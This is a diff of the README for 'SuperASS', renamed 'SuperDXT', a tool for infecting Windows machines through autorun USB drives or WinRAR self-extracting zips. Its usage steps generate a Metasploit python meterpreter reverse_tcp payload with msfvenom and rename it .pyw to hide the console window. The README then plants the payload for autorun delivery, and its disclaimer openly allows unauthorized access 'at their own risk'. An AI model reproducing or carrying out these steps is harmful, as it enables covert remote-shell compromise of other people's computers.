@@ -15,25 +15,25 @@
 
 ## [+] Installation
 
-##### The SuperASS project is set up first in Kali Linux, and then the virus boot is set up in Windows :
+##### The SuperDXT project is set up first in Kali Linux, and then the virus boot is set up in Windows :
 
 * You can set up the project initially in Termux, but the remaining steps in preparing a zip file or creating a boot disk require Windows.
 
  - For KALI Linux :
-    - ```git clone https://github.com/AbdulazizDXT/SuperASS```
-    - ```cd SuperASS```
+    - ```git clone https://github.com/AbdulazizDXT/SuperDXT```
+    - ```cd SuperDXT```
     - ```chmod +x install.sh```
     - ```./install.sh```
 
 #### Or, directly run :
 ```
-git clone https://github.com/AbdulazizDXT/SuperASS ;cd SuperASS ;chmod +x install.sh ;./install.sh
+git clone https://github.com/AbdulazizDXT/SuperDXT ;cd SuperDXT ;chmod +x install.sh ;./install.sh
 
 ```
 ## [+] Usage
 
 1. Run the script
-2. SuperASS file window will open automatically after installation
+2. SuperDXT file window will open automatically after installation
 3. Open Terminal and Type "msfvenom -p python/meterpreter/reverse_tcp LHOST={YourIPAddres} LPORT={Your Port} -o Update.py
 4. ReName file --> "Update.py" to "Update.pyw" For hide python console
 5. Copy the Update.pyw file to the Open SuperASS window and click Replace
@@ -51,7 +51,7 @@ git clone https://github.com/AbdulazizDXT/SuperASS ;cd SuperASS ;chmod +x instal
 
 - Notice : When you use USB Autorun Creator, all USB contents will be deleted, be careful!
 
-## [+]  Use SuperASS In Zip File AutoRun :
+## [+]  Use SuperDXT In Zip File AutoRun :
 
 1. Download WinRAR From : https://www.win-rar.com/download.html?&L=0
 2. Install & Check [√]
@@ -93,7 +93,7 @@ exploit
 
 ## [+] Something very important!
 
-- This tool is developed for educational purposes. Here he explains how hacking works. If anyone wants to gain unauthorized access to someone's devices, they can try it at their own risk. You have your own responsibilities and you are responsible for any damage or violation of laws by this tool. The author is not responsible for any misuse of SuperASS!
+- This tool is developed for educational purposes. Here he explains how hacking works. If anyone wants to gain unauthorized access to someone's devices, they can try it at their own risk. You have your own responsibilities and you are responsible for any damage or violation of laws by this tool. The author is not responsible for any misuse of SuperDXT!
  
 ## [+] I'm Here!
 
